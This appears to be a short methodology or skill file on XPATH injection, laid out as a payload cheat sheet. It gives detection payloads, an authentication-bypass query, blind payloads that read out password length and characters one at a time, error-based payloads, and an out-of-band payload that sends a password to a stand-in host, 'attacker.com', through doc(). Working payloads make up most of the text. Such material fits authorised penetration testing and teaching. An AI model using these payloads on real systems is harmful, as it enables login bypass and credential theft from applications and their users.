---
name: xpath-injection
description: XPATH injection — authentication bypass, blind XPATH, booleanization, out-of-band extraction
category: vulnerabilities
---

# XPATH Injection Methodology

## What It Is
XPATH Injection exploits improperly sanitized user input in XPATH queries, similar to SQLi but targeting XML data stores.

## Detection Payloads
```
' OR '1'='1
' OR ''='
" OR ""="
' OR 1=1 and ''='
' and count(/*)=1 and '1'='1
' and '1'='1' and '1'='2
1' and '1'='2
```

## Authentication Bypass
```xpath
// Normal:   /users/user[username/text()='admin' and password/text()='pass']
// Bypass:   /users/user[username/text()='admin' and password/text()='' or '1'='1']
```

## Blind XPATH Injection
- Booleanization: Compare string lengths character by character
```
' and string-length(password/text())>5 and '1'='1   → true
' and string-length(password/text())>10 and '1'='1  → false
```
- Character extraction:
```
' and substring(password/text(),1,1)='a' and '1'='1
```

## Out-of-Band XPATH
- Use `doc()` function to make HTTP requests:
```
' and doc('http://attacker.com/'||password) and '
```
- XPATH 2.0+ has more functions: `unparsed-text()`, `base-uri()`

## Error-Based XPATH
- Payloads that cause specific error messages:
```
' or '1'='2' and doc('nonexistent') 
' | //*
' | //user[contains(.,'admin')]
```

## Tools
- Burp Intruder with XPATH payload list
- `xpath_tool` — automated XPATH injection
